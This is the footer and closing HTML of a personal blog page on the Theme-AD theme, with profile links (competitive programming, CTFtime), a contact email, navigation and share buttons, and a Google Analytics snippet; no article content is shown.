              <a href="https://oi.ototot.tw" target="_blank">OI解題雜筆</a>
            </span>
          
            <span class="site-footer-item">
              <a href="https://codeforces.com/profile/oToToT" target="_blank">Codeforces</a>
            </span>
          
            <span class="site-footer-item">
              <a href="https://ctftime.org/user/46758" target="_blank">CTF Time</a>
            </span>
          
        </div>
      
    
<!--
    <div class="site-footer-info">
      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
    </div>
-->
    
    
      <div class="site-footer-info">
        <i class="fa fa-at"></i> Email: ty1208chiang@gmail.com
      </div>
    
    <div class="site-footer-info">
      <i class="fa fa-copyright"></i> 
      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
      All rights reserved.
    </div>
  </footer>
</div>

    <div id="site-layer" style="display:none;">
  <div class="site-layer-content">
    <div class="site-layer-header">
      <span class="site-layer-header-title" id="site-layer-title"></span>
      <i class="fa fa-close" id="site-layer-close"></i>
    </div>
    <div class="site-layer-body" id="site-layer-container">
      <div class="site-layer-input" id="site-layer-search" style="display: none;">
        <div class="site-layer-input-choose">
          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
        </div>
        <input type="text">
        <i class="fa fa-search"></i>
      </div>
      
      <div id="site-layer-welcome" style="display:none;"></div>
    </div>
  </div>
</div>
    

<div class="bottom-bar">
  <div class="bottom-bar-left">
    <a href="javascript:void(0);" data-enable="false">
      <i class="fa fa-arrow-left"></i>
    </a>
    <a href="/passages/AIS3-2019-pre/" data-enable="true">
      <i class="fa fa-arrow-right"></i>
    </a>
  </div>
  <div class="bottom-bar-right">
    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
      <i class="fa fa-bars"></i>
    </a>
    
      <a href="#disqus_thread" data-enable="true">
        <i class="fa fa-commenting"></i>
      </a>
    
    <a href="javascript:void(0);" id="site-toggle-share-btn">
      <i class="fa fa-share-alt"></i>
    </a>
    
    <a href="javascript:void(0);" id="back-top-btn">
      <i class="fa fa-chevron-up"></i>
    </a>
  </div>
</div>
    <div id="share-btn">
  
    <a id="share-btn-twitter" href="javascript:void(0);" target="_blank">
      <i class="fa fa-twitter"></i>
    </a>
  
  
    <a id="share-btn-facebook" href="javascript:void(0);" target="_blank">
      <i class="fa fa-facebook"></i>
    </a>
  
  
  
  
</div>
    
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-43236443-6"></script>
  <script async>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-43236443-6');
  </script>






    
  </body>
</html>